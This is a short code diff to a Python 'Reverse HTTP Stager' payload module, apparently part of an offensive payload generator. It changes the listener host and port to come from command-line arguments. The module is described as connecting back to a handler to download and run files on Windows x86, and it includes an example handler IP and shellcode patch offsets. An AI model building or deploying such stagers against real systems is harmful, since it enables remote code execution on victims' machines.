@@ -13,15 +13,15 @@ import sys
 
 class PayloadModule:
 
-    def __init__(self):
+    def __init__(self, cli_arguments):
         self.name = "Reverse HTTP Stager (Stage 1)"
         self.description = "Connects back to a handler to download and run\
             fun files over HTTP :)"
         self.cli_name = "rev_http"
         self.platform = "Windows"
         self.arch = "x86"
-        self.lport = 4444
-        self.lhost = None   # '192.168.63.133\x00' this is encoded('string-escape') and appended to the end
+        self.lport = int(cli_arguments.port)
+        self.lhost = cli_arguments.ip   # '192.168.63.133\x00' this is encoded('string-escape') and appended to the end
         self.lport_offset = 180  # This is actually going to be little endian
         self.uri_offset = 252
         self.exit_func = '\xf0\xb5\xa2\x56'
